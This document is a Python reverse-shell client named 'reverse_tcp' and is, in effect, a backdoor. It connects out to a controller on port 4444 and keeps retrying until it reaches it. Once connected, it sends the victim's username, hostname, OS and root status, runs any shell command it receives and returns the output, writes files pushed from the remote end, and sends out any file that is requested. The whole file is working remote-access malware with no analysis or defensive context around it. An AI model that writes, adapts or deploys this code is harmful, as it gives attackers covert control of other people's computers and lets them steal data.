# reverse_tcp
host = '0.0.0.0'
port = 4444

import os
import socket
import platform
import subprocess
from time import sleep

client = socket.socket()

def init(text):
    while True:
        try:
            client.connect((host, port))
            client.send(text.encode('gbk'))
            break
        except Exception:
            sleep(30)

def getprompt(systemv):
    if 'Linux' in systemv:
        if os.getuid() ==0 :
            return 'root@'+socket.gethostname()+':'+os.getcwd()+'#'
        else:
            return os.getlogin()+'@'+socket.gethostname()+':'+os.getcwd()+'$'
    else:
        return os.getcwd()+'>'

def getsystemv():
    sysv = platform.platform()
    loginuser = os.getlogin()
    if 'Linux' in sysv:
        if os.getuid() == 0:
            loginuser = 'root'

    return loginuser + '/' + socket.gethostname() + '/' + sysv


if __name__ == '__main__':
    systemv = getsystemv()
    text = getprompt(systemv) +'`'+systemv
    init(text)

    while True:
        try:
            cmd = client.recv(1024).decode('gbk')
            print(cmd)
            other = cmd.split(' ')
            first = other[0]
        except Exception:
            init(text)
            continue
        if first == 'mantis':
            pass
        elif first == 'cd':
            try:
                os.chdir(other[1])
                client.send(getprompt(systemv).encode('gbk'))
            except Exception: # chidir
                client.send(getprompt(systemv).encode('gbk'))

        elif first == 'shell':
            try:
                if len(other) > 1:
                    ccmd =''
                    for i in range(1,len(other)):
                        ccmd += other[i] +' '
                    res = subprocess.Popen(ccmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    result, _ = res.communicate()
                
                    client.send(result)
                    client.send("``````````".encode('gbk'))
            except Exception:
                init(text)

        elif first == 'upload':
            try:
                dst = other[1]
                fsize = int(other[2])
                content = client.recv(fsize)
                with open(dst,'wb') as f:
                    f.write(content)
            except Exception:
                init(text)

        elif first == 'download':
            try:
                src = other[1]
                if os.path.isfile(src):
                    fsize = os.path.getsize(src)
                    client.send(str(fsize).encode('gbk'))
                    with open(src,'rb') as f:
                        content = f.read()
                        client.send(content)
                else:
                    client.send(b'0')
            except Exception:
                init(text)
